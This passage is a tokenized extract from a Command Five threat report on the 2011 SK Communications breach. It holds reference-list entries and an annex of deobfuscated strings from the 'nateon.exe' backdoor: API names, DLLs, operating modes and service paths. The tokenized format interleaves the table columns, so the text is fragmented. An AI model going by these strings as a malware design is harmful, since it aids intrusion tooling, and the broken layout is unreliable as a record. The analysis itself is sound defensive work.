"Five", "Pty", "Ltd", ":", "http://www.commandfive.com/papers/C5_APT_ADecadeInReview.pdf", "Domain", "Tools", ",", "LLC", "."], ["(", "2011", ")", "."], ["AlYAc.org", "\u00ad", "Al", "Y", "Ac", "\u00ad", "Screenshot", "History", "."], ["Retrieved", "September", "08", ",", "2011", ",", "from", "DomainTools", ":", "http://www.domaintools.com/research/screenshot\u00adhistory/alyac.org", "Domain", "Tools", ",", "LLC", "."], ["(", "2011", ")", "."], ["Reverse", "Whois", "Lookup", "|", "Domain", "Ownership", "Search", "|", "Domain", "Tools", "."], ["Retrieved"], ["September", "22", ",", "2011", ",", "from", "Domain", "Tools", ":", "http://www.domaintools.com/research/reverse\u00ad"], ["whois/?all[]=leecooper%40korea.com&none[]="], ["EDaily", "."], ["(", "2011", ",", "August", "11", ")", "."], ["Nate", "hack", "related", "."], ["Retrieved", "September", "14", ",", "2011", ",", "from", "EDaily", "Korean", "News", ":", "http://www.edaily.co.kr/news/NewsRead.edy?SCD=DC16&newsid=02056566596346336&DCD=A0140", "5&OutLnkChk", "=", "Y", "ESTsoft", "."], ["(", "2011", ",", "August", "04", ")", "."], ["ESTsoft", "apology", "for", "ALTools", "security", "vulnerability", "."], ["Retrieved", "September", "14", ",", "2011", ",", "from", "ESTsoft", "Blog", ":", "http://blog.estsoft.co.kr/138", "ESTsoft", "."], ["(", "2011", ",", "August", "05", ")", "."], ["ESTsoft", "news", "release", "with", "respect", "to", "ALTools", "security", "vulnerability", "."], ["Retrieved"], ["September", "19", ",", "2011", ",", "from", "ESTsoft", "Blog", ":", "http://blog.estsoft.co.kr/139", "ESTsoft", "."], ["(", "2011", ",", "August", "11", ")", "."], ["Police", "release", "interim", "results", "on", "Nate", "hack", "."], ["Retrieved", "September", "14", ",", "2011", ",", "from", "ESTsoft", "Blog", ":", "http://blog.estsoft.co.kr/143", "ESTsoft", "."], ["(", "2011", ",", "August", "04", ")", "."], ["Urgent", "security", "patches", "for", "public", "ALTools", "products", "."], ["Retrieved", "September", "20", ",", "2011", ",", "from", "ALTools", "Announcements", ":", "http://www.altools.co.kr/Plaza/Notice_Contents.aspx?idx=828", "ETnews", "."], ["(", "2011", ",", "August", "05", ")", "."], ["ETnews", "\u00ad", "Nate", "hack", ",", "planned", "since", "last", "year", "?"], ["Retrieved", "August", "12", ",", "2011", ",", "from", "http://www.etnews.com/news/print.html?id=201108050128", "GFI", "SandBox", "."], ["(", "2011", ",", "May", "30", ")", "."], ["GFI", "SandBox", "Malware", "Analysis", "Report", ":", "Backdoor", "."], ["Win32.Generic", "."], ["Retrieved"], ["September", "22", ",", "2011", ",", "from", "GFI", "SandBox", ":", "http://xml.ssdsandbox.net/view/6c6adbd087276ae89f8262582798b708", "GFI", "SandBox", "."], ["(", "2011", ",", "July", "15", ")", "."], ["GFI", "SandBox", "Malware", "Analysis", "Report", ":", "Trojan", "."], ["Win32.AgentBypass", "."], ["Retrieved", "August", "25", ",", "2011", ",", "from", "http://xml.ssdsandbox.net/view/fdf2c5c2b1874efe7fd335092df2d3bc", "GFI", "SandBox", "."], ["(", "2011", ",", "May", "29", ")", "."], ["GFI", "SandBox", "Malware", "Analysis", "Report", ":", "Trojan", "."], ["Win32.Generic!SB", "Trojan", "."], ["Trojan", "."], ["Win32.Generic", "."], ["Retrieved", "September", "2011", ",", "2011", ",", "from", "http://xml.ssdsandbox.net/view/bce1069dd099f15170c5fd05bae921b5", "GFI", "Software", "."], ["(", "2011", ",", "February", "08", ")", "."], ["CWSandbox", "Report", "By", "MD5", "at", "Sunbelt", "Security", "."], ["Retrieved", "September", "22", ",", "2011", ",", "from", "http://www.sunbeltsecurity.com/partnerresources/cwsandbox/md5.aspx?id=e8ee9373ee6c836042e8f"], ["48d8de2dda9"], ["Goodin", ",", "D.", "(", "2011", ",", "August", "12", ")", "."], ["Software", "maker", "fingered", "in", "Korean", "hackocalypse", "."], ["Retrieved", "September", "06", ",", "2011", ",", "from", "The", "Register", ":", "http://www.theregister.co.uk/2011/08/12/estsoft_korean_megahack/", "PAGE", "13", "OF", "24"], ["COPYRIGHT"], ["\u00a9", "COMMAND", "FIVE", "PTY", "LTD", "."], ["ALL", "RIGHTS", "RESERVED", "."], ["Hauri", "\u00ad", "Response", "Team", "."], ["(", "2011", ",", "August", "04", ")", "."], ["SK", "Communications", "detailed", "analysis", "report", "of", "nateon.exe", "malware", "."], ["Retrieved", "August", "12", ",", "2011", ",", "from", "http://www.hauri.co.kr/updata/SK_detail_report.pdf", "Hispasec", "Sistemas", "."], ["(", "2011", ",", "September", "06", ")", "."], ["VirusTotal", "."], ["Retrieved", "September", "22", ",", "2011", ",", "from", "http://www.virustotal.com/file\u00ad", "scan", "/", "report.html?id=727c5a2c3db079351a79351a79367a1d9eada072a8e19bce0a02eb680088e8eae9b", "d67\u00ad1315308204"], ["Hispasec", "Sistemas", "."], ["(", "2011", ",", "August", "03", ")", "."], ["VirusTotal", "\u00ad", "Free", "online", "Virus", ",", "Malware", "and", "URL", "Scanner", "."], ["Retrieved", "August", "12", ",", "2011", ",", "from", "http://www.virustotal.com/file\u00ad"], ["scan", "/", "report.html?id=74455d5e8f99272aec64bce106b1e8ff39a122a7d27d362a274af31ab5a4fb1e\u00ad", "1313643321"], ["Hispasec", "Sistemas", "."], ["(", "2011", ",", "August", "19", ")", "."], ["VirusTotal", "\u00ad", "Free", "Online", "Virus", ",", "Malware", "and", "URL", "Scanner", "."], ["Retrieved"], ["September", "22", ",", "2011", ",", "from", "http://www.virustotal.com/file\u00ad"], ["scan", "/", "report.html?id=74455d5e8f99272aec64bce106b1e8ff39a122a7d27d362a274af31ab5a4fb1e\u00ad", "1313760695"], ["Hispasec", "Sistemas", "."], ["(", "2011", ",", "July", "29", ")", "."], ["VirusTotal", "\u00ad", "Free", "Online", "Virus", ",", "Malware", "and", "URL", "Scanner", "."], ["Retrieved", "September", "22", ",", "2011", ",", "from", "http://www.virustotal.com/file\u00ad"], ["scan", "/", "report.html?id=74455d5e8f99272aec64bce106b1e8ff39a122a7d27d362a274af31ab5a4fb1e\u00ad", "1311902003"], ["Hispasec", "Sistemas", "."], ["(", "2011", ",", "August", "07", ")", "."], ["VirusTotal", "\u00ad", "Free", "Online", "Virus", ",", "Malware", "and", "URL", "Scanner", "."], ["Retrieved", "August", "18", ",", "2011", ",", "from", "http://www.virustotal.com/file\u00ad"], ["scan", "/", "report.html?id", "=", "b6aecab3c07e915e27db4b4be4c32de1ffa613029818bbd1bb755653c10fbe38\u00ad", "1311920836"], ["Japanese", "IT", "Promotion", "Agency", "."], ["(", "2011", ",", "June", "29", ")", "."], ["IPA", "/", "ISEC", ":", "Vulnerabilities", ":", "Security", "Alert", "for", "Vulnerability", "in", "ALZip", "."], ["Retrieved", "September", "18", ",", "2011", ",", "from", "Japanese", "IT", "Promotion", "Agency", ":", "http://www.ipa.go.jp/security/english/vuln/201106_alzip_en.html", "Jin\u00adwoo", "Seo", ",", "J.\u00adh", "."], ["H.", "(", "2011", ",", "July", "28", ")", "."], ["35mn"], ["User", "Info", "Leaked", "in", "Cyber", "Attack", "against", "S.", "Korean", "Portals", "."], ["Retrieved"], ["September", "19", ",", "2011", ",", "from", "MK", "Business", "News", ":", "http://news.mk.co.kr/english/newsRead.php?sc=30800005&cm=General&year=2011&no=491540&selF", "lag", "=", "sc&relatedcode=&wonNo=&sID=308", "JSUNPACK", "."], ["(", "2011", ",", "July", "27", ")", "."], ["jsunpack", "\u00ad", "a", "generic", "JavaScript", "unpacker", "."], ["Retrieved", "August", "14", ",", "2011", ",", "from", "http://jsunpack.jeek.org/dec/go?report=9f5addc7e0c7c57eab347ba10e9a81a032cf0daf", "JSUNPACK", "."], ["(", "2011", ",", "July", "27", ")", "."], ["jsunpack", "\u00ad", "a", "generic", "JavaScript", "unpacker", "."], ["Retrieved", "August", "08", ",", "2011", ",", "from", "http://jsunpack.jeek.org/dec/go?report=f84cd73dabf186607f986df98c5402a57bb58ad1", "JSUNPACK", "."], ["(", "2011", ",", "July", "27", ")", "."], ["jsunpack", "\u00ad", "a", "generic", "JavaScript", "unpacker", "."], ["Retrieved", "August", "04", ",", "2011", ",", "from", "http://jsunpack.jeek.org/dec/go?report=2c645b8dee2789a0d5d1c1e173ca3bb6b0d0528e", "Kryo", "."], ["(", "2010", ",", "February", "6", ")", "."], ["kryo.se", ":", "iodine", "(", "IP\u00adover\u00adDNS", ",", "IPv4", "over", "DNS", "tunnel", ")", "."], ["Retrieved", "September", "18", ",", "2011", ",", "from", "kryo.se", ":", "http://code.kryo.se/iodine", "Malc0de.com", "."], ["(", "n.d", ".", ")", "."], ["116.127.121", "|", "Malc0de", "Database", "."], ["Retrieved", "August", "22", ",", "2011", ",", "from", "Malc0de", "Database", ":", "http://malc0de.com/database/index.php?search=116.127.121&IP=on", "Microsoft", "."], ["(", "2007", ",", "December", "10", ")", "."], ["A", "description", "of", "Svchost.exe", "in", "Windows", "XP", "Professional", "Edition", "."], ["Retrieved"], ["September", "07", ",", "2011", ",", "from", "Microsoft", "Support", ":", "http://support.microsoft.com/?kbid=314056", "PAGE", "14", "OF", "24"], ["COPYRIGHT", "\u00a9", "COMMAND", "FIVE", "PTY", "LTD", "."], ["ALL", "RIGHTS", "RESERVED", "."], ["Microsoft", "."], ["(", "2007", ",", "December", "04", ")", "."], ["What", "is", "a", "DLL", "?"], ["Retrieved", "September", "18", ",", "2011", ",", "from", "Microsoft", "Support", ":", "http://support.microsoft.com/kb/815065", "Microsoft", "."], ["(", "n.d", ".", ")", "."], ["Security", "Center", "\u00ad", "Bulletins", "Advisories", "Tools", "Guidance", "Resources", "."], ["Retrieved", "September", "09", ",", "2011", ",", "from", "Microsoft", "Security", "TechCenter", ":", "http://technet.microsoft.com/en\u00adus/security/default", "Mister", "Group", "."], ["(", "n.d", ".", ")", "."], ["nateon.exe", "\u00ad", "What", "is", "the", "nateon.exe", "?"], ["Retrieved", "September", "06", ",", "2011", ",", "from", "http://systemexplorer.net/db/nateon.exe.html", "Moon\u00adyoung", ",", "L.", "(", "2011", ",", "August", "12", ")", "."], ["Personal", "information", "hack", "traced", "to", "Chinese", "IP", "address", "."], ["Retrieved", "September", "09", ",", "2011", ",", "from", "The", "Hankyoreh", "Media", "Company", ":", "http://english.hani.co.kr/arti/english_edition/e_national/491514.html", "Mullaney", ",", "C.", "(", "2011", ",", "July", "30", ")", "."], ["Backdoor", "."], ["Sogu", "Technical", "Details", "|", "Symantec", "."], ["Retrieved", "August", "18", ",", "2011", ",", "from", "http://www.symantec.com/security_response/writeup.jsp?docid=2011\u00ad073003\u00ad5345\u00ad99", "National", "Institute", "of", "Standards", "and", "Technology", "."], ["(", "n.d", ".", ")", "."], ["National", "Vulnerability", "Database", "."], ["Retrieved", "September", "20", ",", "2011", ",", "from", "http://nvd.nist.gov/home.cfm"], ["Novell", "."], ["(", "2011", ")", "."], ["Novell", "Customer", ":", "Cite", "Media", "Holding", "Group", "."], ["Retrieved", "July", "29", ",", "2011", ",", "from", "http://www.novell.com/success/cite.html", "Parkour", ",", "M.", "(", "2011", ",", "July", "14", ")", "."], ["contagio", ":"], ["Jul", "13", "CVE\u00ad2010\u00ad2883", "PDF", "Meeting", "Agenda", "with", "more", "Poison", "Ivy", "www.adv138mail.com", "|", "112.121.171.94", "."], ["Retrieved", "September", "22", ",", "2011", ",", "from", "Contagiodump", "Blog", ":", "http://contagiodump.blogspot.com/2011/07/jul\u00ad13\u00adcve\u00ad2010\u00ad2883\u00adpdf\u00admeeting\u00adagenda.html", "Samsung", "IDC", "."], ["(", "2011", ",", "August", "05", ")", "."], ["Samsung", "IDC", "Helpdesk", "Notice", "."], ["Retrieved", "August", "12", ",", "2011", ",", "from", "http://www.samsungidc.com/helpdesk/notice_view.jsp?bpd_seq=0000001532", "SK", "Communications", "."], ["(", "n.d", ".", ")", "."], ["SK", "Communications", "\u00ad", "About", "Us", "."], ["Retrieved", "September", "06", ",", "2011", ",", "from", "http://corp.skcomms.co.kr/eng/global.htm", "Sung\u00adjin", ",", "Y.", "(", "2011", ",", "July", "28", ")", "."], ["35", "m", "Cyworld", ",", "Nate", "users", "'", "information", "hacked", "."], ["Retrieved", "September", "06", ",", "2011", ",", "from", "Korea", "Herald", ":", "http://www.koreaherald.com/lifestyle/Detail.jsp?newsMLId=20110728000881"], ["The", "Internet", "Archive", "."], ["(", "2010", ",", "August", "14", ")", "."], ["Error", "page", "."], ["Retrieved", "September", "18", ",", "2011", ",", "from", "The", "Internet", "Archive", "Wayback", "Machine", ":", "http://web.archive.org/web/20100814135834/http://www.cph.com.tw/1jebugldgJtOAjb1wnXe8A==", "ThreatExpert", "."], ["(", "2011", ",", "July", "13", ")", "."], ["ThreatExpert", "Report", ":", "Trojan.Win32.Scar.dysk", ",", "Bat", "/", "sdel", "."], ["Retrieved", "September", "22", ",", "2011", ",", "from", "http://www.threatexpert.com/report.aspx?md5=16a31aa8e7ddf66a31551840573b6575"], ["ThreatExpert", "."], ["(", "2011", ",", "August", "03", ")", "."], ["ThreatExpert", "Report", ":", "Trojan.Win32.Scar.dzoc", "."], ["Retrieved", "September", "22", ",", "2011", ",", "from", "http://www.threatexpert.com/report.aspx?md5=bce1069dd099f15170c5fd05bae921b5", "ThreatExpert", "."], ["(", "2011", ",", "July", "29", ")", "."], ["ThreatExpert", "Report", ":", "Virus", "."], ["Win32.Virut", "."], ["Retrieved", "September", "22", ",", "2011", ",", "from", "http://www.threatexpert.com/report.aspx?md5=aba9baea70825e6adf0723587f273dc4", "TMCnews", "."], ["(", "2011", ",", "August", "11", ")", "."], ["S.", "Korea", "plans", "to", "scrap", "online", "real\u00adname", "system", "."], ["Retrieved", "September", "19", ",", "2011", ",", "from", "TMCnews", ":", "http://www.tmcnet.com/usubmit/2011/08/11/5698912.htm", "PAGE", "15", "OF", "24"], ["COPYRIGHT", "\u00a9", "COMMAND", "FIVE", "PTY", "LTD", "."], ["ALL", "RIGHTS", "RESERVED", "."], ["ANNEX", "A", "LIST", "OF", "DEOBFUSCATED", "STRINGS", "FOUND"], ["WITHIN", "\u2018", "NATEON.EXE", "\u2019"], ["Strings", "inside", "\u2018", "nateon.exe", "\u2019", "are", "stored", "in", "an", "obfuscated", "form", "and", "only", "deobfuscated", "as", ",", "and", "while", ",", "they", "are", "needed", "."], ["This", "table", "contains", "a", "complete", "list", "of", "deobfuscated", "strings", "extracted", "during", "static", "binary", "analysis", "of", "the", "malicious", "file", "."], ["For", "each", "string", ",", "two", "addresses", "are", "provided", "\u2013", "the", "\u2018", "Code", "Address", "\u2019", "and", "the", "\u2018", "Obfuscated", "Address", "\u2019", "."], ["The", "\u2018", "Code", "Address", "\u2019", "is", "the", "address", ",", "in", "code", ",", "from", "which", "the", "string", "deobfuscation", "is", "requested", "."], ["This", "address", "can", "be", "used", "to", "efficiently", "identify", "wrapper", "functions", "that", "dynamically", "import", "system", "APIs", "(", "such", "as", "those", "used", "for", "network", "communications", ")", ",", "as", "well", "as", "to", "locate", "interesting", "parts", "of", "the", "malware", "."], ["The", "\u2018", "Obfuscated", "Address", "\u2019", "is", "the", "address", ",", "in", "data", ",", "where", "the", "obfuscated", "string", "is", "stored", "."], ["For", "readability", ",", "the", "strings", "presented", "in", "the", "\u2018", "Deobfuscated", "String", "\u2019", "column", "have", "been", "converted", "from", "their", "original", "formats", "."], ["Some", "of", "the", "strings", "are", "stored", "inside", "\u2018", "nateon.exe", "\u2019", "as", "8\u00adbit", "character", "strings", "and", "some", "as", "16\u00adbit", "wide", "character", "strings", "."], ["Non\u00adprintable", "characters", "have", "been", "escaped", "as", "hexadecimal", "values", "in", "the", "form", "\u2018", "<", "\\xHH", ">", "\u2019", "or", "\u2018", "<", "\\uHHHH", ">", "\u2019", "."], ["Trailing", "null", "(", "\u2018", "<", "\\x00", ">", "\u2019", ")", "characters", "are", "not", "shown", "."], ["Standard", "escape", "sequences", "such", "as", "\u2018", "\\n", "\u2019", "(", "newline", ")", "and", "\u2018", "\\r", "\u2019", "(", "carriage", "return", ")", "are", "also", "used", "to", "improve", "readability", "."], ["CODE"], ["ADDRESS", "OBFUSCATED", "ADDRESS", "DEOBFUSCATED", "STRING", "CODE"], ["ADDRESS", "OBFUSCATED", "ADDRESS", "DEOBFUSCATED", "STRING", "10001022", "100220C0", "\"", "LocalFree", "\"", "10003D46", "10022294", "\"", "user32.dll", "\"", "10001071", "100220CC", "\"", "GetOEMCP", "\"", "10003D8A", "100222A0", "\"", "advapi32.dll", "\"", "100010BB", "100220D8", "\"", "GetCommandLineW", "\"", "10003DC9", "100222B0", "\"", "gdi32.dll", "\"", "10001105", "100220EC", "\"", "GetCurrentProcess", "\"", "10003E09", "100222BC", "\"", "ws2_32.dll", "\"", "1000114F", "10022100", "\"", "Sleep", "\"", "10003E4C", "100222C8", "\"", "shell32.dll", "\"", "1000119E", "10022108", "\"", "ExitProcess", "\"", "10003E90", "100222D8", "\"", "shlwapi.dll", "\"", "100011EA", "10022118", "\"", "TerminateProcess", "\"", "10003ED2", "100222E8", "\"", "psapi.dll", "\"", "1000123B", "1002212C", "\"", "lstrcmpiW", "\"", "10003F12", "100222F4", "\"", "mpr.dll", "\"", "1000128D", "10022138", "\"", "WaitForSingleObject", "\"", "10003F52", "10022300", "\"", "wtsapi32.dll", "\"", "100012DF", "10022160", "\"", "SetEvent", "\"", "10003F88", "10022310", "\"", "version.dll", "\"", "1000132E", "1002216C", "\"", "GetLastError", "\"", "10003FC8", "10022320", "\"", "msvcrt.dll", "\"", "10001378", "100221B0", "\"", "CommandLineToArgvW", "\"", "10004008", "1002232C", "\"", "wininet.dll", "\"", "100013F5", "10022150", "\"", "TlsSetValue", "\"", "10004048", "1002233C", "\"", "sfc.dll", "\"", "10001761", "100221C4", "\"", "SeDebugPrivilege", "\"", "10004089", "10022348", "\"", "odbc32.dll", "\"", "100017A2", "100221E8", "\"", "SeTcbPrivilege", "\"", "100040C8", "10022354", "\"", "ole32.dll", "\"", "10001A97", "1002217C", "\"", "SetServiceStatus", "\"", "10004101", "10022360", "\"", "iphlpapi.dll", "\"", "10001B6A", "10022208", "\"", "SMI\"51", "10004151", "10022370", "\"", "wsprintfA", "\"", "10001BD6", "10022214", "\"", "SMU", "\"", "10004192", "1002237C", "\"", "wsprintfW", "\"", "10001C47", "10022220", "\"", "SMRAC", "\"", "100047B7", "10022388", "\"", "lstrlenA", "\"", "10001C8A", "10022230", "\"", "SMRACU", "\"", "10004806", "10022394", "\"", "lstrlenW", "\"", "10001DA0"], ["10022190", "\"", "RegisterServiceCtrlHandlerExW", "\"", "10004855", "100223A0", "\"", "MultiByteToWideChar", "\"", "10003AD9", "10022240", "\"", "GetProcessHeap", "\"", "100048B2", "100223B8", "\"", "WideCharToMultiByte", "\"", "10003B23", "1002225C", "\"", "HeapFree", "\"", "10004913", "100223D0", "\"", "memcpy", "\"", "10003B8F", "10022250", "\"", "HeapAlloc", "\"", "10004969", "100223D8", "\"", "memset", "\"", "10003C64", "10022268", "\"", "FreeLibrary", "\"", "10004FC9", "100223E0", "\"", "InitializeCriticalSection", "\"", "10003CCD", "10022278", "\"", "ntdll.dll52", "\"", "10005035", "100223FC", "\"", "DeleteCriticalSection", "\""], ["10003D03", "10022284", "\"", "kernel32.dll", "\"", "100050C5", "10022414", "\"", "SetErrorMode", "\"", "10005109", "10022424", "\"", "SeDebugPrivilege", "\"", "10005137", "10022448", "\"", "SeTcpPrivilege", "\"", "100054DE", "1002285C", "\"", "EnumServicesStatusW", "\"", "SMI", ",", "SMU", ",", "SMRAC", ",", "SMRACU", "are", "the", "operating", "modes", "of", "\u2018", "nateon.exe", "\u2019", "."], ["(", "Hauri", "\u00ad", "Response", "Team", ",", "2011", ")"], ["52"], ["The", "strings", "with", "suffix", "\u2018", ".dll", "\u2019", "identify", "modules", "loaded", "dynamically", "by", "the", "malware", "."], ["51", "PAGE", "16", "OF", "24"], ["COPYRIGHT", "\u00a9", "COMMAND", "FIVE", "PTY", "LTD", "."], ["ALL", "RIGHTS", "RESERVED", "."], ["CODE"], ["ADDRESS", "OBFUSCATED", "ADDRESS", "DEOBFUSCATED", "STRING", "CODE"], ["ADDRESS", "OBFUSCATED", "ADDRESS", "DEOBFUSCATED", "STRING", "100056C8", "100228A4", "\"", "QueryServiceConfig2W", "\"", "100084B0", "10022774", "\"", "*", "\"", "10005854", "10022C34", "\"", "CompanyName", "\"", "10008503", "1002277C", "\"", "*", "\"", "1000589F", "10022C50", "\"", "*", "\"", "10008544", "10022764", "\"", "System", "\"", "100058DC", "10022C58", "\"", "FileDescription", "\"", "1000856D", "10022754", "\"", "System", "\"", "10005927", "10022C00", "\"", "*", "\"", "10008596", "10022728", "\"", "System", "Idle", "Process", "\"", "1000596E", "10022C7C", "\"", "FileVersion", "\"", "1000875B", "100226F8", "\"", "GetTcpTable", "\"", "100059B9", "10022C98"], ["\"", "*", "\"", "1000884E", "10022680", "100059F5", "10022CA0", "\"", "ProductName", "\"", "\"", "AllocateAndGetTcpExTableFrom", "Stack", "\"", "10005A40", "10022774", "\"", "*", "\"", "100088F8", "100226C8", "\"", "GetExtendedTcpTable", "\"", "10005A8C", "10022CBC", "\"", "ProductVersion", "\"", "10008B17", "100227D0", "\"", "*", "\""], ["10005AD7", "10022CDC", "\"", "*", "\"", "10008B5F", "100227D8", "\"", "*", "\"", "10006021", "10022468", "\"", "CloseHandle", "\"", "10008B99", "100227C0", "\"", "System", "\"", "10006070", "1002249C", "\"", "GetDiskFreeSpaceExW", "\"", "10008BC2", "100227B0", "\"", "System", "\"", "100060C8", "100224B4", "\"", "GetVolumeInformationW", "\"", "10008BEB", "10022784", "\"", "System", "Idle", "Process", "\"", "1000612A"], ["100224CC", "\"", "CreateDirectoryW", "\"", "10008DC4", "10022708", "\"", "GetUdpTable", "\"", "1000617B", "100224E0", "\"", "CreateFileW", "\"", "10008E9C", "100226A4", "100061DB", "100224F0", "\"", "GetFileSize", "\"", "\"", "AllocateAndGetUdpExTableFrom", "Stack", "\"", "1000622D", "10022500", "\"", "GetFileTime", "\"", "10008F46", "100226E0", "\"", "GetExtendedUdpTable", "\"", "10006285", "10022510", "\"", "WriteFile", "\"", "10008FDE", "100227E0", "\"", "WaitForMultipleObjects", "\"", "100062E0", "1002251C", "\"", "ReadFile", "\"", "100093DD", "100227F8", "\"", "GetIconInfo", "\"", "1000633B", "10022528", "\"", "SetEndOfFile", "\"", "1000942F", "10022808"], ["\"", "DestroyIcon", "\"", "1000638A", "10022538", "\"", "SetFileTime", "\"", "1000947E", "10022818", "\"", "OpenProcess", "\"", "100063E2", "10022548", "\"", "SetFilePointer", "\"", "100094D2", "10022828", "\"", "OpenSCManagerW", "\"", "1000643A", "10022558", "\"", "FindFirstFileW", "\"", "10009525", "10022838", "\"", "OpenServiceW", "\"", "1000648C", "10022568", "\"", "FindNextFileW", "\"", "1000957A", "10022848", "\"", "CloseServiceHandle", "\"", "100064DE", "10022578", "\"", "FindClose", "\"", "100095C9", "10022874", "\"", "QueryServiceConfigW", "\"", "1000652D", "10022584", "\"", "FlushFileBuffers", "\"", "10009623", "1002288C", "\"", "ChangeServiceConfigW", "\"", "1000657C", "10022598", "\"", "lstrcpyW", "\"", "10009683", "100228BC", "\"", "DeleteService", "\"", "100065D0", "100225A4", "\"", "CreateProcessW", "\"", "100096D2", "100228CC", "\"", "StartServiceW", "\"", "10006631", "100225C8", "\"", "memcmp", "\"", "10009725", "100228DC", "\"", "ControlService", "\"", "10006766", "10022478", "\"", "QueryDosDeviceW", "\"", "10009779", "100228EC", "\"", "CreateDCW", "\"", "100067B9", "100225D0", "\"", "\\Device\\Floppy<\\x00><\\uA4BC", ">", "<", "\\u5CD1", ">", "\"", "100097CE", "100228F8", "\"", "GetDIBits", "\"", "1000982C", "10022904", "\"", "DeleteDC", "\"", "100067D3", "100225D0", "\"", "\\Device\\Floppy<\\x00><\\uA4BC", ">", "<", "\\u5CD1", ">", "\"", "1000987B", "10022910", "\"", "DeleteObject", "\"", "100098CA", "10022920", "\"", "ExtractIconExW", "\"", "10006862", "1002248C", "\"", "GetDriveTypeW", "\"", "10009923", "10022930", "\"", "EnumProcesses", "\"", "10006941", "100225F0", "\"", "%", "s", "\"", "10009978", "10022940", "\"", "EnumProcessModules", "\"", "10006990", "100225F8", "\"", "%", "s", "\"", "100099D0", "10022954", "\"", "GetModuleFileNameExW", "\""], ["10006AC7", "10022600", "\"", "*", "."], ["*", "\"", "10009A28", "10022984", "\"", "SfcIsFileProtected", "\"", "100076E4", "100225B4", "\"", "SHFileOperationW", "\"", "10009D14", "10022A24", "\"", "*", "\"", "10007ACC", "1002263C", "\"", "WNetCloseEnum", "\"", "10009D42", "10022A2C", "\"", "*", "\"", "10007CD5", "10022618", "\"", "WNetOpenEnumW", "\"", "10009D7E", "100229F8", "\"", "NT", "AUTHORITY", "\""], ["10007DE6", "10022628", "\"", "WNetEnumResourceW", "\"", "10009DAD", "10022A14", "\"", "SYSTEM", "\"", "10007F65", "10022650", "\"", "%", "s", "\"", "10009DD6", "100229CC", "\"", "NT", "AUTHORITY", "\"", "10007FB7", "10022658", "\"", "%", "s", "\"", "10009E05", "100229E8", "\"", "SYSTEM", "\""], ["10007FFC", "10022660", "\"", "%", "s", "\"", "10009E39", "100229A0", "\"", "NT", "AUTHORITY", "\"", "1000804F", "10022668", "\"", "%", "s", "\"", "10009E6B", "100229BC", "\"", "SYSTEM", "\"", "100081E5", "10022670", "\"", "GetVersionExW", "\"", "10009ECA", "10022A80", "\"", "*", "\"", "1000825D", "10022718"], ["\"", "SetTcpEntry", "\"", "10009F13", "10022A70", "\"", "System", "\"", "PAGE", "17", "OF", "24"], ["COPYRIGHT", "\u00a9", "COMMAND", "FIVE", "PTY", "LTD", "."], ["ALL", "RIGHTS", "RESERVED", "."], ["CODE"], ["ADDRESS", "OBFUSCATED", "ADDRESS", "DEOBFUSCATED", "STRING", "CODE"], ["ADDRESS", "OBFUSCATED", "ADDRESS", "DEOBFUSCATED", "STRING", "10009F42", "10022A60", "\"", "System", "\"", "1000CC42", "10022EA4", "\"", "CloseWindowStation", "\"", "10009F6E", "10022A34", "\"", "System", "Idle", "Process", "\"", "1000CC91", "10022EB8", "\"", "OpenInputDesktop", "\"", "10009F9A", "10022A88", "\"", "CompanyName", "\"", "1000CCE4", "10022ECC", "\"", "SetThreadDesktop", "\"", "10009FDB", "10022AA4", "\"", "*", "\"", "1000CD33", "10022EE0", "\"", "GetThreadDesktop", "\"", "1000A020", "10022AAC", "\"", "FileDescription", "\"", "1000CD82", "10022EF4", "\"", "CloseDesktop", "\"", "1000A064", "10022A24", "\"", "*", "\"", "1000CDD1", "10022F04", "\"", "SetCursorPos", "\"", "1000A0A9"], ["10022AD0", "\"", "FileVersion", "\"", "1000CE23", "10022F44", "\"", "GetCurrentThreadId", "\"", "1000A0ED", "10022AEC", "\"", "*", "\"", "1000CE6D", "10022F58", "\"", "CreateThread", "\"", "1000A131", "10022AF4", "\"", "ProductName", "\"", "1000CEC8", "10022F68", "\"", "CreateCompatibleDC", "\"", "1000A175", "10022998", "\"", "*", "\"", "1000CF17", "10022F7C"], ["\"", "CreateDIBSection", "\"", "1000A1AF", "10022B10", "\"", "ProductVersion", "\"", "1000CF72", "10022F90", "\"", "SetDIBColorTable", "\"", "1000A1F3", "10022B30", "\"", "*", "\"", "1000CFC9", "10022FA4", "\"", "GdiFlush", "\"", "1000A730", "1002296C", "\"", "GetModuleInformation", "\"", "1000D013", "10022FB0", "\"", "GetDeviceCaps", "\"", "1000A7CC", "10022B38", "\"", "*", "\"", "1000D067", "10022FC0", "\"", "BitBlt", "\"", "1000A805", "10022B40", "\"", "\\??\\<\\x00><\\uFC04><\\uF06C", ">", "\"", "1000D0C9", "10022FC8", "\"", "SelectObject", "\"", "1000A859", "10022B4C", "\"", "\\SystemRoot\\<\\x00><\\u7C84", ">", "<", "\\u98E4", ">", "\"", "1000D136", "10022FD8", "\"", "DISPLAY", "\"", "1000A8AE", "10022B68", "\"", "\\<\\x00><\\uFFFD", ">", "\"", "1000DB81", "10022FEC", "\"", "DISPLAY", "\"", "1000A919", "10022B70"], ["\"", "CompanyName", "\"", "1000DE8A", "10023000", "\"", "DISPLAY", "\"", "1000A95B", "10022B8C", "\"", "*", "\"", "1000E3BE", "10023014", "\"", "DISPLAY", "\"", "1000A999", "10022B94", "\"", "FileDescription", "\"", "1000E9AB", "10022F34", "\"", "PostMessageA", "\"", "1000A9D8", "10022BB8", "\"", "*", "\""], ["1000EA13", "10022F24", "\"", "keybd_event", "\"", "1000AA13", "10022BC0", "\"", "FileVersion", "\"", "1000EA8B", "10022F14", "\"", "mouse_event", "\"", "1000AA52", "10022BDC", "\"", "*", "\"", "1000EB1C", "10023028", "\"", "WinSta0", "\"", "1000AA8E", "10022BE4", "\"", "ProductName", "\"", "1000EB3F", "10022E74", "\"", "OpenWindowStationW", "\""], ["1000AAD0", "10022C00", "\"", "*", "\"", "1000EC3C", "1002303C", "\"", "GetTickCount", "\""], ["1000AB0E", "10022C08", "\"", "ProductVersion", "\"", "1000EC86", "1002304C", "\"", "ConnectNamedPipe", "\"", "1000AB50", "10022C28", "\"", "*", "\"", "1000ECD8", "10023060", "\"", "CreateNamedPipeW", "\"", "1000B445", "10022CE4", "\"", "DISPLAY", "\"", "1000ED3F", "10023074", "\"", "GetOverlappedResult", "\"", "1000B6A3", "10022CF8", "\"", "SYSTEM\\CurrentControlSet\\Serv", "ices\\<\\x00><\\u90A0", ">", "\u00dc\u00d0", "\"", "1000ED96", "1002308C", "\"", "CreateEventW", "\"", "1000F0CF", "1002309C", "1000B6DB", "10022D40", "\"", "\\Parameters<\\x00><\\u3858", ">", "\"", "\"", 